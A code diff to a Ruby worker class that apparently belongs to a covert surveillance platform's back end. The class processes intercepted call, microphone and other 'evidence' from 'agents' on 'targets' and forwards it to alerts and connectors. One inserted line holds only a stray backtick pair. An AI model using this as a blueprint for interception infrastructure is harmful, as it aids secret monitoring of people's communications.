@@ -47,15 +47,17 @@ end
 
 class InstanceWorker
   include RCS::Tracer
-  
-  SLEEP_TIME = 10
+
+  SLEEP_TIME = 30
+  RESUME_TIME = 10
 
   def get_agent_target
-    @agent = Item.agents.where({ident: @ident, instance: @instance}).first
+    @agent = Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
     raise InvalidAgentTarget.new("Agent \'#{@ident}:#{@instance}\' cannot be found.") if @agent.nil?
     @target = @agent.get_parent
+    trace :debug, "GET_AGENT_TARGET agent: #{@agent['name']} target: #{@target['name']}"
   end
-  
+
   def initialize(instance, ident)
     @instance = instance
     @ident = ident
@@ -74,7 +76,7 @@ class InstanceWorker
       return
     end
 
-    trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']} (target #{@target['_id']})"
+    trace :info, "Created processor for agent #{ident}:#{instance} (target #{@target['_id']})"
 
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
@@ -95,7 +97,7 @@ class InstanceWorker
 
             # get binary evidence
             data = RCS::DB::GridFS.get(raw_id, "evidence")
-            raise "Empty evidence" if data.nil?
+            next if data.nil?
 
             raw = data.read
 
@@ -127,7 +129,7 @@ class InstanceWorker
             end
 
             ev_type = ''
-
+ ``
             evidences.each do |ev|
 
               next if ev.empty?
@@ -151,37 +153,37 @@ class InstanceWorker
               # get info about the agent instance from evidence db
               begin
                 get_agent_target
-              rescue InvalidAgentTarget => e
-                trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
-                RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
-                return
-              end
 
-              processor = case ev[:type]
-                            when 'call'
-                              @call_processor ||= CallProcessor.new(@agent, @target)
-                              @call_processor
-                            when 'mic'
-                              @mic_processor ||= MicProcessor.new(@agent, @target)
-                              @mic_processor
-                            else
-                              @single_processor ||= SingleProcessor.new(@agent, @target)
-                              @single_processor
-                          end
+                processor = case ev[:type]
+                              when 'call'
+                                @call_processor ||= CallProcessor.new
+                                @call_processor
+                              when 'mic'
+                                @mic_processor ||= MicProcessor.new
+                                @mic_processor
+                              else
+                                @single_processor ||= SingleProcessor.new
+                                @single_processor
+                            end
 
-              # override original type
-              ev[:type] = ev.type if ev.respond_to? :type
-              ev_type = ev[:type]
+                # override original type
+                ev[:type] = ev.type if ev.respond_to? :type
+                ev_type = ev[:type]
 
-              begin
-                evidence_id, index = processor.feed(ev) do |evidence|
+                evidence_id, index = processor.feed(ev, @agent, @target) do |evidence|
                   # check if there are matching alerts for this evidence
                   RCS::DB::Alerting.new_evidence(evidence) unless evidence.nil?
+
+                  trace :debug, "FORWARDING #{evidence.type}"
 
                   # forward the evidence to connectors (if any)
                   RCS::DB::Connectors.new_evidence(evidence) unless evidence.nil?
                 end
-                
+
+              rescue InvalidAgentTarget => e
+                trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
+                RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
+                return
               rescue Exception => e
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] #{e.backtrace}"
@@ -225,9 +227,11 @@ class InstanceWorker
   def resume
     @state = :running
     @seconds_sleeping = 0
+    trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] #{@evidences.size} evidences in queue for processing."
   end
   
   def take_some_rest
+    #resume_pending if @seconds_sleeping % RESUME_TIME == 0
     sleep 1
     @seconds_sleeping += 1
   end
@@ -248,7 +252,7 @@ class InstanceWorker
   def sleeping_too_much?
     @seconds_sleeping >= SLEEP_TIME
   end
-  
+
   def queue(id)
     @evidences << id unless id.nil?
 
@@ -258,6 +262,23 @@ class InstanceWorker
         EM.defer @process
       end
     end
+  end
+
+  def resume_pending
+    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] resuming pending evidences."
+    db = Mongoid.database
+    evidences = db.collection('grid.evidence.files').find({filename: "#{@ident}:#{@instance}", metadata: {shard: RCS::DB::Config.instance.global['SHARD']}}, {sort: ["_id", :asc]})
+    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] no resumable evidences to process." if @evidences.empty?
+    evidences.each do |ev|
+      ident, instance = ev['filename'].split(":")
+
+      # resume pending evidence
+      QueueManager.instance.queue instance, ident, ev['_id'].to_s
+    end
+
+    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] done resuming."
+  rescue Exception => e
+    trace :error, "[#{e.class}] #{e.message}"
   end
 
   def to_s
